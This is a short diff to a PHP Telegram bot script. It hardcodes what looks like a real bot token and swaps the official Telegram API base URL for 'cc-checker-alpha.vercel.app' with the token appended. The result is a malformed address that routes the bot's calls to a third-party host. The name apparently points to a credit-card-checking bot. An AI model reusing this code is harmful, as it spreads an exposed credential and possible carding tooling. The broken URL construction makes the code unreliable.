@@ -4,8 +4,8 @@
 
 ///https://api.telegram.org/bot<token>/setwebhook?url=<url>
 
-$botToken = ""; // Enter ur bot token
-$website = "https://api.telegram.org/bot".$botToken;
+$botToken = "1998928377:AAEY6-5Ic1gOTkYD8KDwc_T7jsqSqDr9POE"; // Enter ur bot token
+$website = "cc-checker-alpha.vercel.app".$botToken;
 error_reporting(0);
 $update = file_get_contents('php://input');
 $update = json_decode($update, TRUE);
